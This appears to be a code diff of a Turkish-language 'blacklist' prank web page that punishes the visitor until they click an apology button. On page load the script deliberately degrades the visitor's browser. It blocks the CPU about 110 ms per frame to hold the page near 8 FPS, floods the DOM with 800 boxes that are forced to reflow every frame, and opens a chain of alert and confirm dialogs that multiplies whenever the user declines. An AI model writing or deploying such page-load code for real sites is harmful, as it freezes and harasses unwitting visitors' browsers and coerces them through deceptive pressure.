@@ -3,101 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KARA LİSTE - ERİŞİM REDDEDİLDİ</title>
+    <title>KARA LİSTE - ERİŞİM ENGELİ</title>
     <style>
         body {
-            background-color: #000;
+            background-color: #050000;
             color: #ff0000;
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Comic Sans MS', cursive; /* Sinir bozucu olması için */
             text-align: center;
             overflow: hidden;
+            margin: 0;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
         }
-        #warning {
-            font-size: 30px;
+        #warning-text {
+            font-size: 50px;
             font-weight: bold;
-            animation: blink 0.5s infinite;
+            text-shadow: 0 0 20px red;
         }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
-            100% { opacity: 1; }
+        .lag-box {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            border: 1px solid rgba(255,0,0,0.2);
         }
-        .info {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #ccc;
-        }
-        /* Gizli butonu sadece bilen bulur (Zortmen usulü) */
-        #apology-btn {
-            background: #222;
-            color: #555;
-            border: 1px solid #333;
-            padding: 5px;
+        button {
+            padding: 15px;
+            background: black;
+            color: red;
+            border: 2px solid red;
             cursor: pointer;
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
+            font-weight: bold;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
 
-    <div id="warning">KARA LİSTEDESİN!</div>
-    <div class="info">Sistem dosyalarına erişim engellendi...</div>
-    <div class="info">Gereksiz işlemler başlatılıyor (FPS: 8)...</div>
-
-    <button id="apology-btn" onclick="stopPunishment()">Özür dilerim (Kurtar beni)</button>
+    <div id="warning-text">KARA LİSTEDESİN! <br> FPS: <span id="fps-counter">8</span></div>
+    <div id="lag-container"></div>
+    
+    <p>Benden özür dilemezsen bu tarayıcı hiçbir yere gidemez.</p>
+    <center>
+        <button onclick="acceptApology()">ÖZÜR DİLERİM</button>
+    </center>
 
     <script>
         let isPunishing = true;
+        const fpsDisplay = document.getElementById('fps-counter');
+        const container = document.getElementById('lag-container');
 
-        // 1. CEZA: Kapatılamayan Uyarı Zinciri
-        async function startAnnoyance() {
-            while (isPunishing) {
-                // X'e bastıkça veya Tamam dedikçe yeni bir tane çıkar
-                alert("KARA LİSTE CEZASI: Benden özür dileyene kadar buradasın!");
-                
-                // Kullanıcıyı bıktıracak onay kutuları
-                let response = confirm("Hata kodlarını temizlemek için özür dileyecek misin?");
-                if (response) {
-                    alert("Sözle yetmez, sağ alttaki gizli butonu bulmalısın!");
-                }
-            }
+        // 1. ADIM: DOM'u binlerce anlamsız kutuyla doldur (GPU'yu yorar)
+        for(let i=0; i<800; i++) {
+            let div = document.createElement('div');
+            div.className = 'lag-box';
+            container.appendChild(div);
         }
 
-        // 2. CEZA: Donanım Kasma (CPU Tüketici)
-        function freezeBrowser() {
+        // 2. ADIM: FPS'i 8'e ÇAKAN MEKANİZMA
+        function killPerformance() {
             if (!isPunishing) return;
+
+            const startTime = performance.now();
             
-            // Boş döngü ile tarayıcıyı kilitler (FPS'i 10'un altına çeker)
-            let end = Date.now() + 100; // Her karede 100ms kilitler
-            while (Date.now() < end) {
-                Math.sqrt(Math.random() * 999999);
+            // Hardcore CPU Bloklama: 
+            // Her kare çizilmeden önce tarayıcıyı yaklaşık 110ms kilitliyoruz.
+            // 1000ms / 125ms ≈ 8 FPS
+            while (performance.now() - startTime < 115) {
+                // Tarayıcıyı meşgul et
+                Math.random() * Math.random();
             }
-            
-            requestAnimationFrame(freezeBrowser);
+
+            // DOM Reflow zorla: Tüm kutuların yerini değiştir
+            const boxes = document.getElementsByClassName('lag-box');
+            for (let box of boxes) {
+                box.style.transform = `translate(${Math.random() * 5}px, ${Math.random() * 5}px)`;
+            }
+
+            requestAnimationFrame(killPerformance);
         }
 
-        // Kurtuluş yolu
-        function stopPunishment() {
+        // 3. ADIM: Sahte Pop-up Yağmuru (X'e basınca 2 tane)
+        function spawnAnnoyingPopup() {
+            if(!isPunishing) return;
+            alert("KARA LİSTE CEZASI: Tarayıcın şu an benim kontrolümde.");
+            if(confirm("Pes ediyor musun?")) {
+                alert("O zaman butona bas!");
+            } else {
+                // Reddederse 2 tane daha açar (Zortmen usulü)
+                setTimeout(spawnAnnoyingPopup, 100);
+                setTimeout(spawnAnnoyingPopup, 300);
+            }
+        }
+
+        function acceptApology() {
             isPunishing = false;
-            document.body.innerHTML = "<h1 style='color:green'>CEZA KALDIRILDI. SİSTEME GİRİŞ YAPABİLİRSİN.</h1>";
+            document.body.innerHTML = "<h1 style='color:lime'>TAMAM ZORTMEN, AFFEDİLDİN. SİSTEM ÇÖZÜLÜYOR...</h1>";
             setTimeout(() => {
-                window.location.href = "https://zortmen.github.io"; // Ana sayfaya at
+                location.reload(); 
             }, 2000);
         }
 
-        // Sayfa yüklendiğinde ceza başlasın
+        // Başlat
         window.onload = () => {
-            freezeBrowser();
-            // Küçük bir gecikme ile uyarı yağmuru başlar
-            setTimeout(startAnnoyance, 1000);
+            killPerformance();
+            setTimeout(spawnAnnoyingPopup, 2000);
         };
+
+        // FPS Sayacını sadece görsel olarak düşük tutalım (Psikolojik baskı)
+        setInterval(() => {
+            if(isPunishing) fpsDisplay.innerText = Math.floor(Math.random() * 3) + 6; 
+        }, 1000);
+
     </script>
 </body>
 </html>
